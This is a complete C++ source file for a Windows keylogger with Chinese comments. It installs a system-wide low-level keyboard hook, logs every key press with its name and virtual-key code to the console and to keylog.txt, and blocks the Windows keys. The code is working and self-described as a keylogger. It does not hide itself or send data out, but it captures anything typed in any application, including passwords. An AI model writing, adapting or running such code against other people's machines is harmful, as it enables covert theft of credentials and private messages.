//keyhook.cpp
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <sstream>

HHOOK hHook = NULL;
KBDLLHOOKSTRUCT kbdStruct;
std::ofstream logFile;  // 全局日志文件对象

// 同时输出到控制台和日志文件的工具函数
void LogMessage(const std::string& message) {
    std::cout << message;  // 实时控制台输出
    if (logFile.is_open()) {
        logFile << message;
        logFile.flush();  // 确保立即写入磁盘
    }
}

// 将虚拟键码转换为键名
std::string GetKeyName(int code) {
    char name[128];
    UINT scanCode = MapVirtualKey(code, MAPVK_VK_TO_VSC);  // 将虚拟键码转换为扫描码
    HKL layout = GetKeyboardLayout(0);  // 获取当前线程的键盘布局
    
    long lParamValue = (scanCode << 16) | (1 << 24);  // 构造lParam参数，模拟真实键盘事件的参数结构
    GetKeyNameTextA(lParamValue, name, 128);  // 将扫描码转换为本地化键名文本
    
    return std::string(name);
}

// 键盘HOOK回调函数
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {  // 有效动作事件
        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);  // 解析键盘数据结构
        
        // 过滤系统快捷键（Win键）
        if (kbdStruct.vkCode == VK_LWIN || kbdStruct.vkCode == VK_RWIN) 
            return 1;  // 阻断系统快捷键响应
        
        // 按键事件处理：打印按键信息
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            std::string keyName = GetKeyName(kbdStruct.vkCode);  // 键码转可读名称
            std::ostringstream oss;  // 构建日志信息（含16进制键码）
            oss << "Key pressed: " << keyName 
                << " [0x" << std::hex << kbdStruct.vkCode << "]\n";
            LogMessage(oss.str());
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);  // 传递至下一处理程序
}

int main() {
    // 打开日志文件（追加模式）
    logFile.open("keylog.txt", std::ios::app);
    if (!logFile.is_open()) {
        std::cerr << "Failed to open log file!\n";
        return 1;
    }

    // 设置控制台编码
    SetConsoleOutputCP(CP_UTF8);
    LogMessage("=== Keylogger Started ===\n");
    
    // 安装键盘HOOK
    hHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,          // 钩子类型：低级键盘事件监控
        LowLevelKeyboardProc,    // 回调函数地址
        GetModuleHandle(NULL),   // 当前可执行模块句柄
        0                        // 关联所有GUI线程
    );
    if (!hHook) {
        LogMessage("Hook failed! Error: " + std::to_string(GetLastError()) + "\n");
        return 1;
    }
    LogMessage("Hook installed. Monitoring keyboard input...\n");

    // 消息循环
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);  // 生成WM_CHAR消息
        DispatchMessage(&msg);   // 分发至窗口过程
    }

    // 卸载键盘HOOK
    UnhookWindowsHookEx(hHook);
    LogMessage("\n=== Keylogger Stopped ===\n");
    logFile.close();  // 关闭日志文件
    return 0;
}
